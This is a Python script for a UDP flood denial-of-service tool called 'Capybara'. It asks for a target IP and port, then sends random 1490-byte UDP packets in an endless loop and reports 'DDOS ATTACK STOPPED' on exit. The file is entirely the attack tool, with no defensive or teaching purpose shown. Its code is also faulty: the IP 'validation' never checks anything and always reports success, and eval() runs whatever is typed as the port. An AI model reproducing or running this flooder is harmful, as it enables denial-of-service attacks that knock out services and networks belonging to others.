#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError
validate = URLValidator()
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print('''

═╗ ╦  ╔═╗┌─┐┌─┐┬ ┬┌┐ ┌─┐┬─┐┌─┐  ═╗ ╦
╔╩╦╝  ║  ├─┤├─┘└┬┘├┴┐├─┤├┬┘├─┤  ╔╩╦╝
╩ ╚═  ╚═╝┴ ┴┴   ┴ └─┘┴ ┴┴└─┴ ┴  ╩ ╚═

	''')

ip = input(" [+] Give Capybara an ip to pull up to : ")
port = eval(input(" [+] Gimme a port number: "))
os.system("clear")
print('''
      
═╗ ╦  ╔═╗┌─┐┌─┐┬ ┬┌┐ ┌─┐┬─┐┌─┐  ═╗ ╦
╔╩╦╝  ║  ├─┤├─┘└┬┘├┴┐├─┤├┬┘├─┤  ╔╩╦╝
╩ ╚═  ╚═╝┴ ┴┴   ┴ └─┘┴ ┴┴└─┴ ┴  ╩ ╚═

	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked.... ")
	print(" [+] Attack Screen Loading ....")
except ValidationError as exception :
	print(" ✘ Input a right url")
print(" ")
print("    Remember I always Pull up 😎 ")
print(" " )
print(" [+] CapyBara is Pulling up to: " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] Capy going to sleep")
